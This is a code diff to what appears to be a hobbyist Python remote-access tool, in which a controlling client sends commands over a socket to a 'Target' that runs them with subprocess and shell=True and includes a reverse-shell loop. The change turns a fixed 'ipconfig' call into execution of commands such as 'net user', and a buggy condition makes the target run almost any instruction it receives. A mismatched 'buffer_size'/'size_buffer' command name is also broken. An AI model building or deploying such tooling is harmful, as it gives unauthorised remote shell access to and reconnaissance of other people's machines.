@@ -6,6 +6,7 @@ import platform
 
 class Machine:
     def __init__(self):
+        self.buffer = 2048
         # create socket
         try:
             self.s = socket.socket()
@@ -35,22 +36,22 @@ class Client(Machine):
             cmd = input("")
             if len(str.encode(cmd)) > 0:
                 self.s.send(str.encode(cmd, "utf-8"))
-                client_response = str(self.s.recv(2048), "utf-8")
+                client_response = str(self.s.recv(self.buffer), "utf-8")
                 print(client_response, end="")
                 if cmd == "quit":
                     break
 
     def quit(self):
         self.s.send(str.encode("quit"))
-        response_target = self.s.recv(2048)
+        response_target = self.s.recv(self.buffer)
         print(response_target.decode("utf-8"))
         super().quit()
 
     def getinfo(self, info):
         self.s.send(str.encode(str(info)))
-        info = self.s.recv(2048)
+        info = self.s.recv(self.buffer)
         print(info.decode("utf-8"))
-        info = self.s.recv(4096)
+        info = self.s.recv(self.buffer)
         print(info.decode("utf-8"))
         input("\n\nPress ENTER")
 
@@ -59,6 +60,10 @@ class Client(Machine):
             self.s.send(str.encode("print_target_True"))
         else:
             self.s.send(str.encode("print_target_False"))
+
+    def set_target_buffer(self, size):
+        self.s.send(str.encode("buffer_size"))
+        self.s.send(str.encode(str(size)))
 
 
 # Target is the server
@@ -93,7 +98,7 @@ class Target(Machine):
 
     def what_to_do(self):
         while True:
-            instruction = self.s.recv(2048)
+            instruction = self.s.recv(self.buffer)
             instruction = instruction.decode("utf-8")
             if instruction == "quit":
                 if self.print:
@@ -108,12 +113,18 @@ class Target(Machine):
                 self.reverse_shell_target()
             elif instruction == "getinfo_generality":
                 self.getinfo_target_generality()
-            elif instruction == "getinfo_network":
-                self.getinfo_target_network()
+            elif instruction == "ipconfig" or "net user":
+                self.getinfo_target_cmd(instruction)
+            elif instruction == "size_buffer":
+                self.buffer = int(self.s.recv(self.buffer))
+                if self.print:
+                    print("the buffer size is %d now", self.buffer)
+                    print(self.buffer)
+                    print(type(self.buffer))
 
     def reverse_shell_target(self):
         while True:
-            data = self.s.recv(4096)
+            data = self.s.recv(self.buffer)
             if data.decode("utf-8") == "quit":
                 if self.print:
                     print("Leaving Shell")
@@ -152,15 +163,15 @@ class Target(Machine):
                   + platform.uname()[2] + "\nVersion: " + platform.uname()[3] + "\nMachine: " + platform.uname()[4]
                   + "\nProcessor: " + platform.uname()[5])
 
-    def getinfo_target_network(self):
-        cmd = subprocess.Popen("ipconfig", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+    def getinfo_target_cmd(self, command):
+        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
         output_str = output_bytes.decode("utf-8", errors='replace')
-        self.s.send(str.encode("Configuration IP: "))
+        self.s.send(str.encode(command))
         self.s.send(str.encode(output_str))
         if self.print:
-            print("Configuration IP: ")
+            print(command)
             print(output_str)
 
     # close de connection and the socket
